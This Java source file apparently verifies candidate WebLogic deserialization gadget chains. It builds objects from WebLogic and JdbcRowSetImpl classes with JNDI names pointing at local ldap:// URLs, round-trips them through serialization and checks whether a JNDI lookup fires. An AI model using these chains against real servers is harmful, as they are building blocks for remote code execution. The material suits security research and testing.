import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.net.*;

/**
 * Verify WebLogic gadget chains at Java level.
 * Tests whether deserialization actually triggers the expected sink.
 *
 * Usage: javac -cp "weblogic_libs_1411/*" ChainVerifier.java
 *        java -cp ".:weblogic_libs_1411/*" ChainVerifier
 */
public class ChainVerifier {

    static int passed = 0, failed = 0, error = 0;

    public static void main(String[] args) throws Exception {
        System.out.println("=== WebLogic Gadget Chain Verifier ===\n");

        testWL6_BufferingConfigQueue();
        testWL7_SQLComparator();
        testWL8_WebLogicAttributeNullObject();
        testWL9_InvertibleComparator();
        testWL10_PureWLChain();

        System.out.println("\n=== RESULTS ===");
        System.out.println("PASSED: " + passed);
        System.out.println("FAILED: " + failed);
        System.out.println("ERROR:  " + error);
    }

    /**
     * WL6: BufferingConfig$Queue -- check if it's Serializable and
     * if deserialization triggers any JNDI-related behavior.
     */
    static void testWL6_BufferingConfigQueue() {
        System.out.println("[WL6] BufferingConfig$Queue -> JNDI");
        try {
            Class<?> queueClass = Class.forName("weblogic.wsee.jaxws.buffer.BufferingConfig$Queue");

            // Check Serializable
            boolean serializable = Serializable.class.isAssignableFrom(queueClass);
            System.out.println("  Serializable: " + serializable);
            if (!serializable) {
                System.out.println("  FAIL: Not Serializable");
                failed++;
                return;
            }

            // Create instance without constructor
            Object queue = createWithoutConstructor(queueClass);
            if (queue == null) {
                System.out.println("  FAIL: Cannot create instance");
                failed++;
                return;
            }

            // Set jndiName field to a test URL
            String testUrl = "ldap://127.0.0.1:1389/CHAIN_WL6_TRIGGERED";
            boolean fieldSet = setFieldValue(queue, "jndiName", testUrl);
            if (!fieldSet) {
                // Try other field names
                fieldSet = setFieldValue(queue, "name", testUrl);
                if (!fieldSet) {
                    // List all fields
                    System.out.println("  Fields:");
                    for (Field f : getAllFields(queueClass)) {
                        System.out.println("    " + f.getType().getSimpleName() + " " + f.getName());
                    }
                }
            }

            // Serialize -> Deserialize
            byte[] serialized = serialize(queue);
            System.out.println("  Serialized size: " + serialized.length + " bytes");

            // Deserialize (catch JNDI attempts)
            try {
                Object deserialized = deserialize(serialized);
                System.out.println("  Deserialized OK (type: " + deserialized.getClass().getName() + ")");

                // Now trigger hashCode/toString/equals to see if JNDI fires
                try {
                    HashMap<Object, Object> map = new HashMap<>();
                    // Use reflection to put without triggering hashCode yet
                    Field tableField = HashMap.class.getDeclaredField("table");
                    tableField.setAccessible(true);

                    // Trigger hashCode
                    System.out.println("  Triggering hashCode()...");
                    try {
                        deserialized.hashCode();
                        System.out.println("  hashCode() returned without JNDI call");
                    } catch (Exception e) {
                        String msg = e.toString();
                        if (msg.contains("JNDI") || msg.contains("lookup") || msg.contains("InitialContext")
                            || msg.contains("NamingException") || msg.contains("ldap") || msg.contains("ConnectException")
                            || msg.contains("CommunicationException")) {
                            System.out.println("  PASS: JNDI lookup triggered! -> " + msg.substring(0, Math.min(200, msg.length())));
                            passed++;
                            return;
                        }
                        System.out.println("  hashCode() threw: " + msg.substring(0, Math.min(200, msg.length())));
                    }

                    // Try toString
                    System.out.println("  Triggering toString()...");
                    try {
                        deserialized.toString();
                    } catch (Exception e) {
                        String msg = e.toString();
                        if (isJndiException(msg)) {
                            System.out.println("  PASS: JNDI lookup triggered via toString()!");
                            passed++;
                            return;
                        }
                        System.out.println("  toString() threw: " + msg.substring(0, Math.min(200, msg.length())));
                    }

                } catch (Exception e) {
                    System.out.println("  Trigger exception: " + e);
                }

                System.out.println("  INCONCLUSIVE: No JNDI call detected from simple triggers");
                // Still useful info - mark as needs further investigation
                failed++;

            } catch (Exception e) {
                String msg = e.toString();
                if (isJndiException(msg)) {
                    System.out.println("  PASS: JNDI triggered during deserialization! -> " + msg.substring(0, Math.min(200, msg.length())));
                    passed++;
                } else {
                    System.out.println("  Deser error: " + msg.substring(0, Math.min(300, msg.length())));
                    failed++;
                }
            }
        } catch (Exception e) {
            System.out.println("  ERROR: " + e);
            error++;
        }
        System.out.println();
    }

    /**
     * WL7: SQLComparator -- check if it implements Comparator<>
     * and if compare() triggers getter methods on its arguments.
     */
    static void testWL7_SQLComparator() {
        System.out.println("[WL7] SQLComparator -> JdbcRowSetImpl -> JNDI");
        try {
            Class<?> sqlCompClass = Class.forName("weblogic.jdbc.rowset.SQLComparator");

            boolean isComparator = Comparator.class.isAssignableFrom(sqlCompClass);
            boolean isSerializable = Serializable.class.isAssignableFrom(sqlCompClass);
            System.out.println("  Comparator: " + isComparator + ", Serializable: " + isSerializable);

            if (!isComparator) {
                System.out.println("  FAIL: Not a Comparator");
                failed++;
                return;
            }

            // Create instance
            Object sqlComp;
            try {
                sqlComp = sqlCompClass.getDeclaredConstructor().newInstance();
            } catch (Exception e) {
                sqlComp = createWithoutConstructor(sqlCompClass);
            }

            if (sqlComp == null) {
                System.out.println("  FAIL: Cannot create instance");
                failed++;
                return;
            }

            // Create JdbcRowSetImpl with attacker dataSource
            Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
            Object jrs = jrsClass.getDeclaredConstructor().newInstance();
            Method setDataSource = jrsClass.getMethod("setDataSourceName", String.class);
            setDataSource.invoke(jrs, "ldap://127.0.0.1:1389/CHAIN_WL7_TRIGGERED");

            // Try compare()
            System.out.println("  Calling SQLComparator.compare(jrs1, jrs2)...");
            @SuppressWarnings("unchecked")
            Comparator<Object> comp = (Comparator<Object>) sqlComp;
            try {
                Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
                setDataSource.invoke(jrs2, "ldap://127.0.0.1:1389/CHAIN_WL7_TRIGGERED2");
                comp.compare(jrs, jrs2);
                System.out.println("  compare() returned normally (no JNDI)");
                // Check what compare actually does - maybe it calls getters
                System.out.println("  INCONCLUSIVE: Need PriorityQueue trigger path");
                failed++;
            } catch (Exception e) {
                String msg = e.toString();
                if (isJndiException(msg)) {
                    System.out.println("  PASS: JNDI triggered via compare()! -> " + msg.substring(0, Math.min(200, msg.length())));
                    passed++;
                } else {
                    System.out.println("  compare() threw: " + msg.substring(0, Math.min(200, msg.length())));
                    // Check if it calls getters that could lead to JNDI
                    System.out.println("  Examining compare() method...");
                    for (Method m : sqlCompClass.getDeclaredMethods()) {
                        System.out.println("    " + m.getName() + "(" + Arrays.toString(m.getParameterTypes()) + ")");
                    }
                    failed++;
                }
            }

            // Also test serialize/deserialize roundtrip
            if (isSerializable) {
                byte[] ser = serialize(sqlComp);
                System.out.println("  Serialized size: " + ser.length + " bytes");
            }

        } catch (Exception e) {
            System.out.println("  ERROR: " + e);
            error++;
        }
        System.out.println();
    }

    /**
     * WL8: WebLogicAttribute$NullObject -- check readResolve behavior.
     */
    static void testWL8_WebLogicAttributeNullObject() {
        System.out.println("[WL8] WebLogicAttribute$NullObject -> readResolve");
        try {
            Class<?> nullObjClass = Class.forName("weblogic.management.internal.WebLogicAttribute$NullObject");

            boolean isSerializable = Serializable.class.isAssignableFrom(nullObjClass);
            System.out.println("  Serializable: " + isSerializable);

            // Check for readResolve
            Method readResolve = null;
            try {
                readResolve = nullObjClass.getDeclaredMethod("readResolve");
                readResolve.setAccessible(true);
                System.out.println("  Has readResolve(): YES");
            } catch (NoSuchMethodException e) {
                System.out.println("  Has readResolve(): NO");
                // Check parent classes
                Class<?> parent = nullObjClass;
                while (parent != null && parent != Object.class) {
                    try {
                        readResolve = parent.getDeclaredMethod("readResolve");
                        readResolve.setAccessible(true);
                        System.out.println("  readResolve() found in: " + parent.getName());
                        break;
                    } catch (NoSuchMethodException ignored) {}
                    parent = parent.getSuperclass();
                }
            }

            // List fields
            System.out.println("  Fields:");
            for (Field f : getAllFields(nullObjClass)) {
                f.setAccessible(true);
                System.out.println("    " + Modifier.toString(f.getModifiers()) + " " +
                    f.getType().getSimpleName() + " " + f.getName());
            }

            // Create and serialize
            Object nullObj = createWithoutConstructor(nullObjClass);
            if (nullObj != null && isSerializable) {
                byte[] ser = serialize(nullObj);
                System.out.println("  Serialized size: " + ser.length + " bytes");

                try {
                    Object deser = deserialize(ser);
                    System.out.println("  Deserialized: " + deser.getClass().getName());
                    // If readResolve changed the type, that's interesting
                    if (!deser.getClass().equals(nullObjClass)) {
                        System.out.println("  INTERESTING: readResolve returned different type: " + deser.getClass().getName());
                    }
                    System.out.println("  PASS: Serialization roundtrip works");
                    passed++;
                } catch (Exception e) {
                    System.out.println("  Deser threw: " + e.toString().substring(0, Math.min(200, e.toString().length())));
                    failed++;
                }
            } else {
                System.out.println("  FAIL: Cannot create/serialize");
                failed++;
            }

        } catch (Exception e) {
            System.out.println("  ERROR: " + e);
            error++;
        }
        System.out.println();
    }

    /**
     * WL9: InvertibleComparator -- check if it's Serializable and delegates compare().
     */
    static void testWL9_InvertibleComparator() {
        System.out.println("[WL9] InvertibleComparator -> delegated compare()");
        try {
            Class<?> invCompClass = Class.forName(
                "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator");

            boolean isComparator = Comparator.class.isAssignableFrom(invCompClass);
            boolean isSerializable = Serializable.class.isAssignableFrom(invCompClass);
            System.out.println("  Comparator: " + isComparator + ", Serializable: " + isSerializable);

            if (!isSerializable) {
                System.out.println("  FAIL: Not Serializable");
                failed++;
                return;
            }

            // Check constructors
            for (Constructor<?> c : invCompClass.getDeclaredConstructors()) {
                System.out.println("  Constructor: " + Arrays.toString(c.getParameterTypes()));
            }

            // Create with a malicious inner comparator
            // InvertibleComparator wraps another Comparator and delegates
            Comparator<Object> innerComp = (a, b) -> {
                System.out.println("    >>> Inner comparator called! a=" +
                    a.getClass().getSimpleName() + " b=" + b.getClass().getSimpleName());
                return 0;
            };

            Object invComp = invCompClass.getDeclaredConstructor(Comparator.class).newInstance(innerComp);
            System.out.println("  Created InvertibleComparator wrapping test comparator");

            // Test delegation
            @SuppressWarnings("unchecked")
            Comparator<Object> comp = (Comparator<Object>) invComp;
            comp.compare("test1", "test2");
            System.out.println("  PASS: Delegation confirmed");
            passed++;

        } catch (Exception e) {
            System.out.println("  ERROR: " + e);
            error++;
        }
        System.out.println();
    }

    /**
     * WL10: Pure WebLogic chain -- verify BooleanComparator is Serializable
     * and can be combined with ProxyDesc.
     */
    static void testWL10_PureWLChain() {
        System.out.println("[WL10] BooleanComparator + ProxyDesc + EmptyTargetSource");
        try {
            // Check BooleanComparator
            Class<?> boolCompClass = Class.forName(
                "com.bea.core.repackaged.springframework.util.comparator.BooleanComparator");
            boolean boolSerializable = Serializable.class.isAssignableFrom(boolCompClass);
            boolean boolComparator = Comparator.class.isAssignableFrom(boolCompClass);
            System.out.println("  BooleanComparator: Comparator=" + boolComparator + " Serializable=" + boolSerializable);

            // Check EmptyTargetSource
            Class<?> etsClass = Class.forName(
                "com.bea.core.repackaged.springframework.aop.target.EmptyTargetSource");
            boolean etsSerializable = Serializable.class.isAssignableFrom(etsClass);
            System.out.println("  EmptyTargetSource: Serializable=" + etsSerializable);

            // Check ProxyDesc
            Class<?> proxyDescClass = null;
            try {
                proxyDescClass = Class.forName("weblogic.iiop.ProxyDesc");
                boolean pdSerializable = Serializable.class.isAssignableFrom(proxyDescClass);
                System.out.println("  ProxyDesc: Serializable=" + pdSerializable);

                // Check readResolve
                try {
                    Method rr = proxyDescClass.getDeclaredMethod("readResolve");
                    System.out.println("  ProxyDesc.readResolve(): EXISTS");
                } catch (NoSuchMethodException e) {
                    System.out.println("  ProxyDesc.readResolve(): not found");
                }
            } catch (ClassNotFoundException e) {
                System.out.println("  ProxyDesc: NOT FOUND in classpath");
            }

            if (boolSerializable && etsSerializable) {
                System.out.println("  PASS: Key classes are Serializable");
                passed++;
            } else {
                System.out.println("  FAIL: Missing Serializable");
                failed++;
            }

        } catch (Exception e) {
            System.out.println("  ERROR: " + e);
            error++;
        }
        System.out.println();
    }

    // --- Utility methods ---

    static boolean isJndiException(String msg) {
        return msg.contains("JNDI") || msg.contains("lookup") || msg.contains("InitialContext")
            || msg.contains("NamingException") || msg.contains("ldap://")
            || msg.contains("ConnectException") || msg.contains("CommunicationException")
            || msg.contains("javax.naming") || msg.contains("NameNotFoundException");
    }

    static Object createWithoutConstructor(Class<?> clazz) {
        try {
            // Use sun.misc.Unsafe or ReflectionFactory
            Class<?> rfClass = Class.forName("sun.reflect.ReflectionFactory");
            Method getFactory = rfClass.getMethod("getReflectionFactory");
            Object rf = getFactory.invoke(null);
            Method newCSFA = rfClass.getMethod("newConstructorForSerialization",
                Class.class, Constructor.class);
            Constructor<?> objCtor = Object.class.getDeclaredConstructor();
            Constructor<?> ctor = (Constructor<?>) newCSFA.invoke(rf, clazz, objCtor);
            ctor.setAccessible(true);
            return ctor.newInstance();
        } catch (Exception e) {
            try {
                // Fallback: try no-arg constructor
                Constructor<?> c = clazz.getDeclaredConstructor();
                c.setAccessible(true);
                return c.newInstance();
            } catch (Exception e2) {
                System.out.println("    createWithoutConstructor failed: " + e2.getMessage());
                return null;
            }
        }
    }

    static boolean setFieldValue(Object obj, String fieldName, Object value) {
        try {
            Field f = null;
            Class<?> clazz = obj.getClass();
            while (clazz != null && clazz != Object.class) {
                try {
                    f = clazz.getDeclaredField(fieldName);
                    break;
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (f == null) return false;
            f.setAccessible(true);
            f.set(obj, value);
            System.out.println("  Set " + fieldName + " = " + value);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    static List<Field> getAllFields(Class<?> clazz) {
        List<Field> fields = new ArrayList<>();
        while (clazz != null && clazz != Object.class) {
            for (Field f : clazz.getDeclaredFields()) {
                fields.add(f);
            }
            clazz = clazz.getSuperclass();
        }
        return fields;
    }

    static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        oos.close();
        return bos.toByteArray();
    }

    static Object deserialize(byte[] data) throws Exception {
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bis);
        return ois.readObject();
    }
}
